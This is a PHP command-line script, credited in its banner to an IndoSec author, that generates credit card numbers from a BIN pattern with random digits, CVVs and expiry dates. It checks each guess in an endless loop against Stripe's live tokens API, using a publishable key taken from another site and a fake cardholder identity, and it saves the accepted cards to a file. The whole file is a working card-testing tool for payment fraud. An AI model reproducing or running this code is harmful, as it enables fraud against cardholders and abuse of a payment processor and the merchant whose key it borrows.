<?php
error_reporting(0);

$banner = "\e[36;1m                                                                                 
                                                                                 
           #         ######   
           #    #             
  ######   #    #  ########## 
           #    #  #        # 
           #######        ##  
##########      #       ##    
                #     ##      
                              
                                                                                 
[#] Credit Card Generator [#]    
                                   
Author : Revan AR                  
Team   : IndoSec                   
Github : https//github.com/revan-ar/\n\n";
                                                                                 
                                                                                                                                                                 
sleep(2);
echo $banner;
sleep(2);

echo "input BIN (ex: 01234567890xxx8x): ";
$a = trim(fgets(STDIN));

$nomor = 1;
while(1){

    $cvv = rand(111, 999);
    $month = rand(1, 12);
    $year = rand(2021, 2025);
    $b = str_split($a, 1);
    $card = "";
    foreach($b as $splitCard){
        $check = ($splitCard == "x") ? rand(0, 9) : $splitCard;
        $card .= $check;
    }

    $splitCard2 = str_split($card, 4);
    $fixCard = implode("+", $splitCard2);
        
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Accept: application/json", "Content-Type: application/x-www-form-urlencoded", "Origin: https://js.stripe.com", "Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fdiscord.com&stripe_xdm_c=default509095&stripe_xdm_p=1"));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=1080400&pasted_fields=number%2Czip&guid=NA&muid=f4d48849-7e13-4640-b065-cac94973692874a7ee&sid=249b36de-691b-410e-8458-5cd8bd46901f63a13a&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&payment_user_agent=stripe.js%2F7315d41&card[number]=".$fixCard."&card[cvc]=".$cvv."&card[name]=Michael+S.+Walker&card[address_line1]=1835++College+Avenue&card[address_line2]=&card[address_city]=TULSA&card[address_state]=OK&card[address_zip]=74192&card[address_country]=US&card[exp_month]=".$month."&card[exp_year]=".$year);
    $exe = curl_exec($ch);
    curl_close($ch);
    
    $response = json_decode($exe);
    
    if($response->error != null){
        echo "\e[31m[-] ".$card."|".$month."/".$year."|".$cvv." -> Invalid\n";
    }else{
        echo "\e[92m[+] ".$card."|".$month."/".$year."|".$cvv." -> Valid\n";
        $o = fopen("validcc.txt", 'a');
        fwrite($o, $card."|".$month."/".$year."|".$cvv."\n");
        fclose($o);
    }
}
